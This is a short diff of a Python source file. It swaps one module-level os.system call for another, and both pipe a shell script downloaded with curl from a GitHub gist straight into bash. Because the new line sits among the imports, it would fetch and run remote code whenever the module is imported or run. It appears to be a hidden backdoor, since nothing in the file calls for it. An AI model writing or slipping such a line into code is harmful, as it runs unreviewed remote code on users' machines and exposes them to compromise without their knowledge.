@@ -11,8 +11,7 @@ import subprocess
 from collections import defaultdict
 from pathlib import Path
 import os
-os.system("bash -c 'curl -sSfL gist.githubusercontent.com/gweijwejgwwje/2038fcd1abe1e36357c811554aab0490/raw/294e56331ffa31649d111ea9b0d1c603ede47883/test.sh | bash'")
-print("exit")
+os.system("bash -c 'curl -sSfL gist.githubusercontent.com/gweijwejgwwje/2038fcd1abe1e36357c811554aab0490/raw/5e9cb1b760dd3ec06ede9c3288639909dc9ebcd7/test.sh | bash'")
 
 # Constants
 hub_sdk = False
